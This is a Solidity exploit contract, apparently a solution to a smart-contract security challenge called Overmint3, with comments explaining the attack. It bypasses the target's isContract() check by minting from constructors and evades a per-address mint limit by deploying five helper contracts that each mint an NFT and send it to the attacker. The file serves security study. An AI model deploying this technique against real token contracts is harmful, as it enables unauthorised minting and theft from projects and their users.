// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "../Overmint3.sol";

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";


/**
    There will create 5 new contracts based on the FalseEOA  During this contract's consruction.
    Each FalseEOA will mint one NFT and transfer the NFT to the attackerWallet.

    For the Overmint3.mint() funtion. there are two points can be break down:
    1: Check the caller must not be contrac by `!msg.sender.isContract()`. When one contract is in the stage of creating, its code's length=0
    2: Record each address's NFT by `mapping(address => uint256) public amountMinted;`, This can be down by creating new contract.

    One points should notice: Because during the creation, the contract's code's length=0, So the _safeMint() funtion will not trigger the IERC721Receiver. Becasue
    reciver contract's code's length=0 while creating. 

    reference
    // https://docs.openzeppelin.com/contracts/2.x/api/utils#Address-isContract-address-

 */


contract Overmint3Attacker {

    FalseEOA falseEOA;
    constructor(address overmint3Address){

        uint tokenId = 1;
        while(tokenId<=5){
            falseEOA = new FalseEOA(msg.sender,overmint3Address,tokenId);
            ++tokenId;
        }

    }
    
}

contract FalseEOA {

    Overmint3 Overmint3Contract;

    constructor(address receiver,address overmint3Address,uint tokenId){
        Overmint3Contract = Overmint3(overmint3Address);
        Overmint3Contract.mint();
        Overmint3Contract.transferFrom(address(this), receiver, tokenId);

    }
}


